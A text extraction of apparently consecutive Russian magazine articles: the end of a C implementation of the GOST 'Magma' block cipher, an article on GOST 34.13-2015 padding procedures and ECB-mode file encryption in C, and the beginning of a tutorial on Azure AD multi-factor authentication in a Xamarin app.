  // Делим 64‐битный исходный блок на две части
  for(i = 0; i < 4; i++)
  {
    a_0[i] = a[4 + i];
    a_1[i] = a[i];
  }
  // Производим преобразование g
  GOST_Magma_g(k, a_0, G);
  // Ксорим результат преобразования g с левой половиной блока
  GOST_Magma_Add(a_1, G, G);
  // Пишем результат GOST_Magma_Add в левую половину блока
  for(i = 0; i < 4; i++)
    a_1[i] = G[i];
  // Сводим правую и левую части блока в одно целое
  for(i = 0; i < 4; i++)
  {
    out_data[i] = a_1[i];
    out_data[4 + i] = a_0[i];
  }
}


ЗАШИФРОВЫВАЕМ
Как мы уже говорили, шифрование производится путем тридцати двух ите‐
раций, с первой по тридцать пер вую с применением преобразования G
и тридцать вторую с применением финального преобразования G:


void GOST_Magma_Encript(const uint8_t *blk, uint8_t *out_blk)
{
  int i;
  // Первое преобразование G
  GOST_Magma_G(iter_key[0], blk, out_blk);
  // Последующие (со второго по тридцать первое) преобразования G
  for(i = 1; i < 31; i++)
    GOST_Magma_G(iter_key[i], out_blk, out_blk);
  // Последнее (тридцать второе) преобразование G
  GOST_Magma_G_Fin(iter_key[31], out_blk, out_blk);
}

Перед запуском данной функции не забудь вызвать GOST_Magma_Expand‐
Key, чтобы заполнить мас сив с итерационными клю чами нужными значени‐
ями.


РАСШИФРОВЫВАЕМ
Расшифровывание выполняется ана логично зашифровыванию с исполь‐
зованием итерационных клю чей в обратном порядке:


void GOST_Magma_Decript(const uint8_t *blk, uint8_t *out_blk)
{
  int i;
  // Первое преобразование G с использованием
  // тридцать второго итерационного ключа
  GOST_Magma_G(iter_key[31], blk, out_blk);
  // Последующие (со второго по тридцать первое) преобразования G
  // (итерационные ключи идут в обратном порядке)
  for(i = 30; i > 0; i‐‐)
    GOST_Magma_G(iter_key[i], out_blk, out_blk);
  // Последнее (тридцать второе) преобразование G
  // с использованием первого итерационного ключа
  GOST_Magma_G_Fin(iter_key[0], out_blk, out_blk);
}

Здесь также не стоит забывать про GOST_Magma_ExpandKey, так как для рас‐
шифровывания используются те же итераци онные ключи, что и для зашиф‐
ровывания.


ЗАКЛЮЧЕНИЕ
Алгоритм «Магма»  из ГОСТ 34.12—2015  гораздо проще реализуется
по сравнению с алгоритмом «Кузнечик» из того же ГОСТа, при этом на сегод‐
няшний день он гораздо чаще используется (в том числе и в варианте
ГОСТ 28147—89 с таблицами замены, определяемыми разработчиками
самостоятельно или руководствуясь методическим документом RFC 4357).
   Теперь ты можешь шифровать как 128‐разрядные блоки (алгоритмом
«Кузнечик»), так и 64‐раз рядные (алгоритмом «Маг ма»). Процедуры шиф‐
рования больших объемов, а также режимы работы (а именно режим простой
замены, режим гаммирова ния, режим гаммирова ния с обратной связью
по выходу, режим простой замены с зацеплением, режим гаммирования
с обратной связью по шифртексту и режим выработки имитовставки) этих
двух алгоритмов изложены в другом норматив ном документе: ГОСТ 34.13—
2015 «Информационная технология. Криптогра фическая защита информа‐
ции. Режимы работы блочных шифров». Об этом в следующих статьях.


        WWW

                    •Исходный код в виде проекта на Qt
                        •Текст ГОСТ 34.12—2015
                  •Методический документ RFC 4357
 КОДИНГ





   Евгений Дроботун
Постоянный автор рубрики
        Malware
     КРИПТУЕМ
  ПО-КРУПНОМУ

      РАЗБИРАЕМСЯ С РЕЖИМАМИ РАБОТЫ
        РОССИЙСКИХ БЛОЧНЫХ ШИФРОВ





 В  предыдущих   статьях  мы  подробно  разобрались,
 как работают два отечествен ных криптоалгоритма «Куз‐
 нечик» и «Магма». Одна ко с их помощью получится зашиф‐
 ровать весьма скудный кусочек информации (если исполь‐
 зовать «Куз нечик», длина этого кусочка составит толь ко
 лишь 16 байт, а если применять «Маг му», то и того мень‐
 ше — всего 8 байт). Понятно, что нынче в такие объемы
 ничего втиснуть не получится, и нужно что‐то с этим делать.


              INFO

                      Предыдущие статьи цикла: про «Стрибог», про
                           «Кузнечик», про «Магму».


  Что с этим делать, подробно изло жено в очередном российском стандарте,
  который именуется ГОСТ 34.13—2015 «Информационная технология. Крип‐
  тографическая защита информа ции. Режимы работы блочных шифров». Этот
  нормативный документ, так же как и его соб ратья по криптографическому
  ремеслу, рожден в Центре защиты информа ции и спе циальной связи ФСБ
  при содействии ОАО «ИнфоТеКС».
    Данный стандарт определяет, каким обра зом зашифровывать и рас‐
 шифровывать сооб щения, размер которых может значительно превышать
  размер одного 8‐ или 4‐байтного бло ка.
    Всего  рассматриваемый  стандарт  опи сывает  и  опре деля ет  шесть
  режимов работы алгоритмов блочного шифрования:
   • режим простой замены (ECB, от английского Electronic Codebook);
   • режим счетчика (CTR, от английско го Counter);
   • режим гаммирования с обратной связью по выходу (OFB, от английского
     Output Feedback);
   • режим прос той замены с зацеплением (CBC, от английского Cipher Block
     Chaining);
   • режим гаммирования с обратной связью по шифртексту (CFB, от англий‐
     ского Cipher Feedback);
   • режим выработки имитовставки (MAC, от английского Message Authentica‐
      tion Code).

 Следует отметить, что стандарт не рег ламентирует строгое использование
  в качестве алгоритма блочного шифрования только «Куз нечик» или «Магму»,
  данный алгоритм может быть любым (так же как и размер одного блока),
  однако в стандарте в качестве примеров рассматриваются блочный шифр
  с размером блока 8 байт (в этом случае подразумевается «Магма») и блоч‐
  ный шифр с размером блока 16 байт (здесь имеется в виду «Кузнечик»).


 ОПЕРАЦИЯ ДОПОЛНЕНИЯ СООБЩЕНИЯ
 Прежде чем непосредственно рас смотреть режимы работы, необ ходимо
  познакомиться с одной весьма важной операци ей — операцией дополнения
  сообщения, или паддинга (от английско го Padding — набивка, заполнение).
    Эта операция применя ется при реализации режимов простой замены,
  простой замены с зацеп лением и режима выработки имитовставки. Дело
  в том, что указанные режимы работают только с сообщениями, длина которых
  кратна размеру одного бло ка (напомню, 8 байт для «Магмы» и 16 байт
  для «Кузнечика»). Для сообщений, длина которых не кратна раз меру блока,
  получающийся остаток необ ходимо дополнить до раз мера полного блока.
    ГОСТ 34.13—2015 определяет три воз можные процедуры дополнения.


 Про цеду ра 1
 Данная процедура применя ется при работе в режиме прос той замены
  или простой замены с зацеплением. Суть процедуры в том, что остаток
  в сообщении допол няется нулями до размера полного блока.





             Схема дополнения в соответствии с процедурой 1

 Использование этой процеду ры не позволяет гарантировать однозначное
  восстановление исходного сообщения из расшифрованного, если неиз вес‐
  тна длина дополнения либо длина исходного сообщения. Не зная длины
  исходного сообщения или длины дополнения, удалить верное количество
  ненужных  нулей  из  рас шифрованного сооб щения  для  вос становления
  исходного просто так не получится.





           Пример допол нения в соответс твии с процеду рой 1


 Про цеду ра 2
 Особенность этого варианта процедуры дополнения заключается в том, что
  дополнение выполняется в любом случае, независимо от того, кратна длина
  сообщения размеру блока или нет. Это поз воля ет восстанавливать исходное
  сообщение из расшифрованного без зна ния дополнительной информации
  (длины исходного сооб щения или длины допол нения).





             Схема дополнения в соответствии с процедурой 2

 При реализации этой процеду ры воз можно два варианта: длина исходного
  сообщения не кратна размеру бло ка (то есть в конце сообщения имеется
  неполный блок) и длина исходного сообщения кратна размеру одного блока.
   В первом случае в первый бит остатка пишет ся единица, а остальное мес‐
  то заполняется нулями до размера полного бло ка. Во втором к сообщению
  добавляется целый дополнительный блок, начинающийся с единичного бита,
  с запол нением остальных раз рядов это го дополнительного блока нулями.
    Такой вариант допол нения  также рекомендован  для использования
  в режиме простой замены или прос той замены с зацеплением.


 Про цеду ра 3
  Эта процедура похожа на пер вую тем, как она выполняется, и на вторую
  содержимым этого дополнения. Если длина сообщения кратна размеру бло‐
  ка, то никаких допол нений делать не нужно, в про тивном случае остаток
  исходного сообщения дополняется до раз мера полного блока единичным
  начальным битом с последующим запол нением нулями.





             Схема дополнения в соответствии с процедурой 3

 Процедуру, реализованную в таком варианте, рекомендуется использовать
  только для режима выработ ки имитовставки.
    Из описанных в стандарте режимов рас смот рим первый.


 РЕЖИМ ПРОСТОЙ ЗАМЕНЫ (ECB)
  Здесь все достаточ но прос то: весь исходный текст делится на блоки, в случае
  необходимости производится дополнение пос леднего блока, далее каждый
  блок шифруется с применением нужного алгоритма блочного шиф рования,
  и в итоге получившиеся зашифрованные блоки и будут составлять зашиф‐
  рованное сообщение. На схеме ниже буквами P обозначены блоки исходного
  текста, K — ключ шифрования, E — алго ритм блочного шифрования в режиме
 зашифровывания, C — зашифрованные блоки.





        Схема работы в режиме прос той замены при зашифровывании

  Расшифровывание реализует ся в обратном порядке. На схеме ниже D —
  алгоритм блочного шифрования в режиме расшифровывания.





       Схема работы в режиме прос той замены при рас шифровывании

  Для того чтобы реализовать данный режим, для начала опре делим несколько
  базовых функций (в коде мы будем использовать опи санные в прошлой
  статье функции  алгоритма блочного шифрования «Магма»,  хотя ничто
  не мешает заменить их функциями блочного шифрования для другого алго‐
  ритма, например «Кузнечика»).


 Определе ние длины исходно го тек ста
  Будем полагать, что исходное сообщение (или исходный текст, подлежащий
 шифровке) содержится в каком‐либо файле  и, соответственно, длиной
  исходного текста будет раз мер этого файла в байтах. Самый простой способ
  узнать это выглядит следующим образом:


  uint64_t get_size_file(FILE *f)
  {
      uint64_t size;
      fseek(f, 0, SEEK_END);
      size = ftell(f);
      fseek(f, 0, SEEK_SET);
      return size;
  }

 Далее узнаем длину необ ходимо го дополнения.


 Определе ние длины допол нения
  Для начала определим такие вот константы (догадаться об их назначении, я
  думаю, тебе не составит труда):


  #define PAD_MODE_1 0x01
  #define PAD_MODE_2 0x02
  #define PAD_MODE_3 0x03

 Функция определения длины дополнения выглядит следующим образом
  (здесь BLCK_SIZE — кон станта, в которой определен размер блока в байтах
  (в нашем  случае —  восемь),  size —  длина  исходного  сообщения,
  pad_mode — вид процеду ры дополнения):


  #define BLCK_SIZE 8
  ...
  ...
  uint8_t get_size_pad(uint64_t size, uint8_t pad_mode)
  {
      if (pad_mode == PAD_MODE_1)
          // Если дополнение для процедуры 1 не нужно, возвращаем 0
          if ((BLCK_SIZE ‐ (size % BLCK_SIZE)) == BLCK_SIZE)
              return 0;
      if (pad_mode == PAD_MODE_3)
          // Если дополнение для процедуры 3 не нужно, возвращаем 0
          if ((BLCK_SIZE ‐ (size % BLCK_SIZE)) == BLCK_SIZE)
              return 0;
      // Возвращаем длину дополнения
      return BLCK_SIZE ‐ (size % BLCK_SIZE);
  }

  Если последний блок исходно го сообщения пол ный (то есть содержит нужное
  количество байтов, в зависимости от алгоритма блочного шиф рования), то
  для процедуры 1 и 3 фун кция воз вратит ноль (то есть допол нение не нужно),
  а для процедуры 2 возвра щаемое значение будет равно раз меру одного бло‐
  ка исходного сооб щения (в нашем случае для алгоритма «Магма» оно будет
  равно восьми). Если же последний блок исходного сообщения неполный, то
  возвращаемое значение будет равно числу бай тов, которое необходимо
  для дополнения этого бло ка исходного сооб щения до полного.


 До писы вание нуж ного содержимого в допол нение
 На вход данной функции пода ется ука затель на учас ток памяти, в котором
  хранится исходное сооб щение, длина дополнения, длина самого исходного
  сообщения и вид процедуры дополнения.


  static void set_padding(uint8_t *in_buf, uint8_t pad_size, uint64_t
  size, uint8_t pad_mode)
  {
      if (pad_size > 0)
      {
          if (pad_mode == PAD_MODE_1) // Для процедуры 1
          {
              uint64_t i;
              for (i = size; i < size + pad_size; i++)
                  // Пишем все нули
                  in_buf[i] = 0x00;
          }
          if (pad_mode == PAD_MODE_2) // Для процедуры 2
          {
              // Пишем единичку в первый бит
              in_buf[size] = 0x80;
              uint64_t i;
              for (i = size + 1; i < size + pad_size; i++)
                  // Далее заполняем все остальное нулями
                  in_buf[i] = 0x00;
          }
          if (pad_mode == PAD_MODE_3) // Для процедуры 3
          {
              // Пишем единичку в первый бит
              in_buf[size] = 0x80;
              uint64_t i;
              for (i = size + 1; i < size + pad_size; i++)
                  // Далее заполняем все остальное нулями
                  in_buf[i] = 0x00;
          }
      }
  }

  Результатом работы функции будет дополненное исходное сообщение (если
  выпол няются все необ ходимые усло вия для дописывания допол нения в конец
  исходного сообщения), либо исходное сообщение останется без изменений
  (в том случае, если дополнение не требует ся).


 Удаляем ключи из памяти
 В предыдущих двух статьях мы не очищали то мес то в памяти, где лежат ите‐
  рационные ключи шифрования, хотя по всем правилам хорошего тона реали‐
  зации криптографических алго ритмов это делать необходимо. Для этого
 напишем простую функцию:


  void GOST_Magma_Destroy_Key()
  {
      int i;
      for (i = 0; i < 32; i++)
          memset(iter_key[i], 0x00, 4);
  }

 В нашем случае функция предназна чена для работы с «Магмой», для алгорит‐
 ма «Кузнечик» при необходимости подобную функцию, я думаю, ты сможешь
  написать сам.


 Шифруем стро ку
 Поскольку файл с исходным сообщени ем может быть достаточно большим,
  то его зашифровывание и расшифровыва ние будем производить отдельными
  порциями. Фун кция получает на вход  ука затель на очередную порцию
  исходного сообщения, ука затель на буфер для хра нения этой очередной пор‐
  ции сообщения в зашифрованном виде, указатель на ключ шифрования
  и размер очередной порции исходного сооб щения.


  void ECB_Encrypt(uint8_t *in_buf, uint8_t *out_buf, uint8_t *key,
  uint64_t size)
  {
      // Определяем количество блоков
      uint64_t num_blocks = size / BLCK_SIZE;
      uint8_t internal[BLCK_SIZE];
      int i;
      // Развертываем ключи
      GOST_Magma_Expand_Key(key);
      for (i = 0; i < num_blocks; i++)
      {
          memcpy(internal, in_buf+i*BLCK_SIZE, BLCK_SIZE);
          // Шифруем блоки
          GOST_Magma_Encrypt(internal, internal);
          memcpy(out_buf + i*BLCK_SIZE, internal, BLCK_SIZE);
      }
      // Очищаем итерационные ключи
      GOST_Magma_Destroy_Key()
  }

 В данном случае для шифрования отдельного блока используется функция
  GOST_Magma_Encrypt из предыдущей статьи. Если нужно шифровать блоки
  алгоритмом  «Кузнечик»,  то вместо нее можно  использовать функцию
  GOST_Kuz_Encrypt из статьи про этот алгоритм (не забудь вместо функций
  GOST_Magma_Expand_Key и GOST_Magma_Destroy_Key использовать соот‐
  ветствующие функции для «Куз нечика»).


 Расшифро вываем стро ку
 Функция аналогична функции зашифровывания строки, за исключением клю‐
  чевой функции GOST_Magma_Decrypt. С ее помощью производится рас‐
 шифровывание одного бло ка сообщения.


  void ECB_Decrypt(uint8_t *in_buf, uint8_t *out_buf, uint8_t *key,
  uint64_t size)
  {
      // Определяем количество блоков
      uint64_t num_blocks = size / BLCK_SIZE;
      uint8_t internal[BLCK_SIZE];
      int i;
      // Развертываем ключи
      GOST_Magma_Expand_Key(key);
      for (i = 0; i < num_blocks; i++)
      {
          memcpy(internal, in_buf + i*BLCK_SIZE, BLCK_SIZE);
          // Расшифровываем блоки
          GOST_Magma_Decrypt(internal, internal);
          memcpy(out_buf + i*BLCK_SIZE, internal, BLCK_SIZE);
      }
      // Очищаем итерационные ключи
      GOST_Magma_Destroy_Key()
  }

  Так же как и в функции зашифровывания, вмес то GOST_Magma_Decrypt в слу‐
  чае необходимости можно использовать GOST_Kuz_Decrypt.


 Шифруем файл целиком
 Мы уже определились, что работать с файлом исходного сообщения будем
  отдельными порциями, поэтому необ ходимо обозначить размер буфера
  для хранения этой порции. Для этого определим константу, в которую
  запишем нужное значение  (я выбрал размер буфера равным одному
  килобайту, ты можешь при желании определить другой):


  #define BUFF_SIZE 1024

 Функция зашифровывания файла выглядит следующим образом:


  void ECB_Encrypt_File(FILE *src, FILE *dst, uint8_t *key, uint64_t
  size, uint8_t pad_mode)
  {
      // Резервируем место под входной и выходной буфер
      uint8_t *in_buf = malloc(BUFF_SIZE + BLCK_SIZE);
      uint8_t *out_buf = malloc(BUFF_SIZE + BLCK_SIZE);
      while (size)
      {
          // Шифруем очередную порцию файла
          if (size > BUFF_SIZE)
          {
              fread(in_buf, 1, BUFF_SIZE, src);
              ECB_Encrypt(in_buf, out_buf, key, BUFF_SIZE);
              fwrite(out_buf, 1, BUFF_SIZE, dst);
              size ‐= BUFF_SIZE;
          }
          // Шифруем последнюю порцию файла
          else
          {
              fread(in_buf, 1, size, src);
              // Делаем дополнение исходного сообщения
              set_padding(in_buf, get_size_pad(size, pad_mode), size,
  pad_mode);
              ECB_Encrypt(in_buf, out_buf, key, size + get_size_pad(
  size, pad_mode));
              fwrite(out_buf, 1, size + get_size_pad(size, pad_mode),
  dst);
              size = 0;
          }
      }
  }

 На вход функции подается указатель на файл с исходным сообщением, ука‐
  затель на файл, в который будет записа но зашифрованное сообщение, ука‐
  затель на ключ шифрования и вид процедуры дополнения.
    При резервировании буфера под очередную порцию исходного сооб‐
  щения и зашифрованного сооб щения мы увеличиваем размер буфера
  на размер одного блока, чтобы была воз можность допол нить исходное сооб‐
 щение полным блоком при режиме дополнения, определяемом процеду‐
  рой 2.


 Расшифро вываем файл
  Расшифровываем файл следующей функцией:


  void ECB_Decrypt_File(FILE *src, FILE *dst, uint8_t *key, uint64_t
  size)
  {
      // Резервируем место под входной и выходной буфер
      uint8_t *in_buf = malloc(BUFF_SIZE);
      uint8_t *out_buf = malloc(BUFF_SIZE);
      while (size)
      {
          // Шифруем очередную порцию файла
          if (size > BUFF_SIZE)
          {
              fread(in_buf, 1, BUFF_SIZE, src);
              ECB_Decrypt(in_buf, out_buf, key, BUFF_SIZE);
              fwrite(out_buf, 1, BUFF_SIZE, dst);
              size ‐= BUFF_SIZE;
          }
          // Шифруем последнюю порцию файла
          else
          {
              fread(in_buf, 1, size, src);
              ECB_Decrypt(in_buf, out_buf, key, size);
              fwrite(out_buf, 1, size, dst);
              size = 0;
          }
      }
  }

  Как видишь, эта функция похожа на функцию зашифровывания файла, только
  отсутствует все, что связано с дополнением и использовани ем функции
  ECB_Decrypt вместо функции ECB_Encrypt.
    При использовании функций ECB_Encrypt_File и ECB_Decrypt_File фай лы,
  с которыми будут работать эти функции, необ ходимо откры вать с параметром
  rb для чтения или wb для записи (то есть откры вать их в режиме двоичных,
  а не текстовых файлов), например вот так:


  ...
  FILE *in_file = fopen("D:/encrypt_test.enc", "rb");
  FILE *out_file = fopen("D:/decrypt_test.dec", "wb");
  ...

  Режим простой замены достаточно несложен в реализации, однако имеет
  один весьма существенный недостаток: если мы будем шифровать сооб‐
  щение, которое содержит в себе одинаковые или повторяющиеся блоки, то
  на выходе мы тоже получим зашифрованные одинаковые или повторя ющиеся
  блоки. Этот недостаток дает возможность вскрыть структуру исходного сооб‐
  щения. На примере ниже повторяющиеся блоки хорошо видны (сверху
  исходный текст, снизу зашифрованный).





            Иллюстра ция недостатка режима прос той замены


 ЗАКЛЮЧЕНИЕ
  Теперь  ты  знаешь,  как  применять  блочные  алгоритмы шифрования
  для работы с сообщениями про извольной длины с использованием режима
  простой замены. В статье этот режим рассмотрен для алгоритма блочного
 шифрования «Магма», одна ко больших сложностей в переработке кода
  для алгоритма «Кузнечик» нет (все необходимые функции мы написали
  во второй статье цикла). Этот режим вполне можно применять для шиф‐
  рования небольших по объему текстовых файлов, в которых отсутс твуют
  какие‐либо структурированные части с одинаковыми данными.


         WWW

                   •Код в виде проектов Qt для алгоритма «Магма»
                                 (в том числе и реализация режима гаммирова‐
                             ния) и для алгоритма «Кузнечик»
                     •Сам текст ГОСТ 34.13—2015
КОДИНГ

МНОГОФАКТОРНАЯ
АУТЕНТИФИКАЦИЯ
ПО-ВЗРОСЛОМУ





   Ромуальд Здебский
   rzdebski@microsoft.com
                             КУЕМ
                  СЕРЬЕЗНЫЙ СОФТ
                    С ПОМОЩЬЮ
                     БЕСПЛАТНОГО
                  ИНСТРУМЕНТАРИЯ





Многофакторная  аутентифика ция,   ставшая  абсолютно
естественной мерой обеспечить безопасность популярных
пользовательских сервисов, стремительно проникает и в
корпоратив ный сегмент. В этой статье мы рассмотрим,
как  добавить  в  мобильное  приложение  воз можность
еще одного подтверждения аутентификации, в дополнение
к  имени  пользователя  и  паролю,  например  звонок
на зарегис трированный на пользователя телефон или ввод
кода из СМС. Помимо этого, будет рассмотрена настройка
backend‐сервисов для реализации дан ной многофакторной
аутентификации.


                                                         -Про фиты мно гофак торной аутен тифика ции для кор
поратив ных при ложе ний
 1. Более надежная аутентификация, чем только имя пользовате ля и пароль.
  К «что‐то, что я знаю» (логин/пароль) добавляется «что‐то, чем обла‐
  даю» — физическое устройство, а про верить, владеет ли им данный поль‐
   зователь, позволяет код в СМС, отправленной на это устройство, или зво‐
   нок на него с запросом пин‐кода.
 2. Удобное управле ние нас тройками подобной сис темы аутентификации —
   вклю чение/выключение разной степени защиты для разных пользовате‐
   лей, настройка различных политик и способов работы допол нительных
  факторов аутентификации.
 3. Возможность исполь зовать учетные данные корпоративной инфраструк‐
   туры для входа в приложения, а не соз давать новые логины и пароли
   для приложения в допол нение к корпоративным.



Мы рассмотрим реализацию этой задачи с помощью следующих продуктов
и технологий:
 • Azure Active Directory — облачный сервис мно гофакторной аутентифика‐
   ции;
 • Azure Active Directory Authentication Libraries (ADAL) — биб лиотеки, обес‐
   печивающие вызовы сервисов многофакторной аутентификации, включая
   проверки сер тифика тов, защищенное соеди нение с облачным сервисом
   аутентификации, отоб ражение необходимых диалогов аутентификации.
  Поддерживает множество платформ и языков программирования;
 • Xamarin Forms — кросс‐платформенное средство соз дания мобильных
   приложений, обеспечивающее компиляцию в нативный код и стопроцен‐
   тный доступ к нативным API. Особен но удоб но для быстрого создания
   приложений с переиспользованием 80–90% и более исходного кода меж‐
   ду iOS, Android, Windows UWP — как раз наш случай для данного примера.
   Xamarin доступен как бесплатная часть Microsoft Visual Studio во всех ее
   версиях, включая бесплатную Visual Studio Community Edition.

Также с помощью Active Directory Federation Services (ADFS) и их интеграции
с Azure Active Directory мы можем использовать для многофакторной аутен‐
тификации корпоративные учетные записи и пароли внутренне го домена Ac‐
tive Directory, но основной упор в этой статье сделаем на первые две задачи.
ADFS будет опциональной задачей, так как, если нам не нужна интеграция
с локальным доменом Active Directory, мы можем соз дать учетные записи
вручную непосредственно в сервисе Azure Active Directory.
   Начнем с настрой ки Azure Active Directory: если у нас нет учетной записи
и доступа к Microsoft Azure, можем легко получить бес платную пробную учет‐
ную запись здесь. В рамках проб ной подписки большое число сервисов пре‐
доставляется бесплатно на год. В целом все, что описано в данной статье, ты
можешь попробовать бес платно.


Ре гистрация мобильного приложе ния для доступа к Azure Active
Directory
Первым шагом мы регистрируем мобильное при ложение в Azure Active Direc‐
tory для того, чтобы получить доступ к сервису. Фактически мы создаем учет‐
ную запись приложения с определенными идентификаторами и настройками
безопасности. Толь ко мобильное при ложение, которое через защищенное
соединение сможет предъ явить данные идентификаторы, получит дос туп
к службе аутентификации.
  Зайдя на портал Azure, в самой левой черной панели служб выбираем
службу Azure Active Directory (или нажимаем All Resources и пользуемся поис‐
ком служб), переходим в подраздел App registrations и регис трируем новую
учетную запись приложения, нажимая New application registration.





                    New App Registration

Запол няем поля новой учетной записи при ложения:
 • Name — любое имя, по которому потом нам самим будет понятно, о каком
   приложении речь;
 • Application Type — выбираем Native, так как у нас будет мобильное при‐
   ложение, а не веб‐сервис;
 • Redirect URI — это фактически идентифика тор, который должен обя-
  зательно совпадать в настройке учет ной записи приложения на сто‐
   роне сервиса с настройкой на стороне клиента. Это может быть любой
   произвольный URI (произвольная строка в формате URI) — он не дол жен
   быть обязательно реальным хостом и не должен быть зарегистрирован
   в DNS.





                   New App Registration Form

Нажимаем Create и получаем новую учетную запись приложения с автомати‐
чески назначенным системой идентификатором, который называется APPLI‐
CATION ID.





                New App Registration Completed

Это очень важный идентификатор — его обязательно должно передать
мобильное приложение вместе с совпадающим с настройкой сервиса Re‐
direct URI, чтобы получить дос туп к службе аутентификации.


Соз дание пользовате ля и включение мно гофак торной аутен -
тификации
Теперь мы создадим пользователя, пароль и вклю чим для него многофак‐
торную аутентификацию.
  Напомню, что, если есть задача использовать учетные записи, уже сущес‐
твующие в организации в локальном домене Active Directory, это можно сде‐
лать с помощью службы Active Directory Federation Services. Тогда нам не нуж‐
но будет заводить поль зователей, можно будет нас траивать многофакторную
аутентификацию для уже существу ющих в домене пользователей, и при входе
в мобильное приложение они будут использовать свои доменные логины
и пароли.
   То есть при исполь зовании AFDS получится такая топология:





                      ADFS Architecture

Мы же продолжим базовый сценарий, который не требует наличия домена
Active Directory и настройки службы ADFS, и заведем пользователя самос‐
тоятельно в Azure Active Directory.
  Заходим в знакомый раздел Azure Active Directory → Users and groups → All
users и нажимаем New user.





                        New User

Далее заполняем информацию о пользователе. Обрати внимание на User
name: если у тебя в под писке Azure сконфигури ровано свое доменное имя —
используй его, если нет — система автомати чес ки сгенери рует доменное
имя в алиасе поль зователя по принципу [логин нашей учетной записи
Azure].onmicrosoft.com. Для целей тес тирования это го дос таточно, для про‐
изводственных систем, очевидно, мы пропишем в подписке Azure свой более
симпатичный домен. Также придумываем и прописываем пароль. На скрин‐
шоте подчеркнут автоматически сгенерированный домен для моей пробной
подписки.





                      New User Form

Нажимаем Create и получа ем новую учетную запись пользователя.
   Теперь включим для нее многофакторную аутентификацию. Заходим
в раздел All users и нажимаем кнопку Multi‐Factor Authentication.





                        Multi‐Factor Authentication Button

Дальше мы попадаем в нас тройки мно гофакторной аутентификации, выбира‐
ем нужного пользователя и нажимаем Enable.





                                Enabling MFA

Мы дол жны получить сооб щение об успешной ини циализации многофак‐
торной аутентификации для данного пользователя.





                        MFA Success

На стороне сервиса все готово — данный пользователь теперь будет аутен‐
тифицироваться многофакторно. Если хочется изменить настрой ки сервиса,
можно зайти в раздел Service settings — сра зу под надписью Multi‐factor au‐
thentication на предпоследнем экране выше.
   Здесь есть, например, интерес ный раз дел, который задает, какие методы
дополнительных «факторов» доступны пользователю.





                       MFA Methods

Здесь можно настроить звонок либо СМС на телефон или подтверждение
через мобильное приложение Microsoft Authenticator.
   Конфигурирование сервиса Azure Active Directory завершено, теперь соз‐
дадим мобильное приложение и интегрируем в него многофакторную аутен‐
тификацию.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ

   МНОГОФАКТОРНАЯ
    АУТЕНТИФИКАЦИЯ
     ПО-ВЗРОСЛОМУ
              КУЕМ СЕРЬЕЗНЫЙ СОФТ С ПОМОЩЬЮ
                  БЕСПЛАТНОГО ИНСТРУМЕНТАРИЯ





Интеграция мно гофак торной аутен тификации в мобильное при-
ложе ние
Как я сказал выше, мы для примера возь мем Xamarin Forms (бес платная часть
Visual Studio), который поз волит нам, переисполь зуя большую часть кода,
получить сразу натив ные мобильные приложения с поддержкой многофак‐
торной аутентификации для iOS, Android и Windows UWP.


Быстрый спо соб — используем готовый исходный код
 1. Забираем код из моего репозитория на GitHub.
 2. Прописываем в код приложения в файле MainPage.xaml.cs идентифика‐
   торы,  которые мы  сконфигурирова ли  при  регистрации  приложения
   в облачном сервисе Azure Active Directory. Их полное соответс твие в при‐
   ложении и сервисе необ ходимо, чтобы сервис не отклонял обращения
   приложения.

clientID — это Application ID из наших настро ек облачного сервиса выше.


public static string clientId = "<<INSERT YOUR CLIENT ID HERE>>";

returnURI — это Redirect URI из наших нас троек облачного сервиса выше.


public static string returnUri = "http://MFATestPCL‐redirect";

Все готово. Теперь мы рассмотрим также соз дание приложения с нуля.


Де тальный спо соб — соз даем приложе ние с нуля
Запускаем Visual Studio (я сейчас использую VS 2017, версия 15.6.7) с уста‐
новленным Xamarin. Это можно проверить, запус тив Visual Studio Installer
и нажав Modify текущей инсталляции Visual Studio.





                             Xamarin Module

Xamarin входит во все версии Visual Studio — даже в бесплатную Community
Edition, но нужно убе диться, что он включен и установлен, как показано выше.
  Запускаем Visual Studio и соз даем новый проект: меню File → New →
Project. Выбираем Cross‐Platform → Mobile App (Xamarin.Forms).





                        New Project

Далее выбираем Blank App и .NET Standard как Code Sharing Strategy.





                         Code Sharing

Получив новый проект, про верим запуск мобильного приложения, по умол‐
чанию стартовый проект выделен жирным шрифтом — Android‐приложе ние.





                                    Solution

Если это не так, сделаем его стартовым: пра вый клик на проекте App.Android
и меню Set as a StartUp Project.
  Нажав F5, запустим приложение на эмулято ре Android и увидим:





                         New App

Убедившись, что все работает, останавлива ем отладку (Shift + F5).
   Чтобы интегрировать многофакторную аутентификацию, под ключим биб‐
лиотеку Azure Active Directory Authentication Libraries (ADAL). Подключить ее
надо будет к каждому проекту: правый клик на каж дом проекте — всего че-
тыре про екта (общий + специфичный под каж дую из трех платформ) =
4 раза → Manage NuGet Packages.





                        Manage NuGet

Далее закладка Browse — вводим в поиск adal и подключаем, нажимая
на кнопку со стрелкой вниз.





                                 Adal Add

Для реализации логики работы с биб лиотекой будем использовать сле‐
дующий подход:
 • в общем проекте определим интерфейс IAuthenticator, через который
   будем вызывать аутентификацию из общего кода;
 • в каждом из платформенных проектов определим специфичную для кон‐
   кретной платформы реализацию взаимодействия аутентификации с поль‐
   зовательским интерфейсом этой плат формы;
 • используя DependencyService, дос тупный в Xamarin Forms, мы сможем
   при  вызове  единого  метода  Authenticate  интерфейса  IAuthenticator
   из общего кода автоматичес ки использовать именно  ту реализацию
   под конкретную платформу, на которой в данный момент запущено при‐
   ложение.

Начинаем с определения интерфейса IAuthenticator в общем для всех плат‐
форм проекте, создаем в нем новый файл IAuthenticator.cs с определением
интерфейса (правый клик на проекте → Add → New Item → Class).


using Microsoft.IdentityModel.Clients.ActiveDirectory;
using System.Threading.Tasks;
namespace App17
{
    public interface IAuthenticator
    {
        Task<AuthenticationResult> Authenticate(string authority,
string resource, string clientId, string returnUri);
    }
}

Как видишь, мы определяем сигнатуру асин хронного метода аутентификации.
AuthenticationResult при успешной аутентифика ции будет содержать получен‐
ный от Azure Active Directory токен. Соберем проекты: правый клик на Solution
→ Build Solution.
   Теперь создаем реализацию это го интерфейса для каждой из платформ.
Он будет очень похож — основывать ся на вызове метода AcquireTokenAsync;
единственное различие, почему его, собственно, и приходится создавать
платформенно‐зависимым, в специфике интегра ции с платформенным UI
через PlatformParameters для отоб ражения всплывающих веб‐диалогов аутен‐
тификации.


Android
Для Android нам нужно инициализировать PlatformParameters текущим окном/
диалогом, то есть в терминах Android — Activity. Для этого мы можем исполь‐
